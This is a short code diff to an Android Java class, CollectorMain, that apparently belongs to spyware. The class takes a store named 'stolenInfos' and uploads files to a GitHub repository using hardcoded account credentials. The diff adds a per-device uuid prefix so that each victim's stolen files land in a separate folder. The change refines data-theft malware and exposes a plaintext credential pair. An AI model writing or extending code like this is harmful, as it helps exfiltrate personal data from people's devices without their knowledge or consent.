@@ -35,6 +35,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 	public void run() {
 		// TODO: Implement this method
 		BinaryPrefImpl sb=TheApplication.instance.stolenInfos;
+		String uuid=TheApplication.instance.uuid;
 		try {
 			GitHubClient ghc=new GitHubClient().setCredentials("RevealEverything", "nao2001nao");
 			Repository repo=null;
@@ -59,6 +60,7 @@ public class CollectorMain extends ContextWrapper implements Runnable {
 			}
 			try {
 				for (String filename:files) {
+					filename=uuid+"/"+filename;
 					Log.d("repo", "upload:" + filename);
 					try {
 						Map<String, String> params = new HashMap<>();
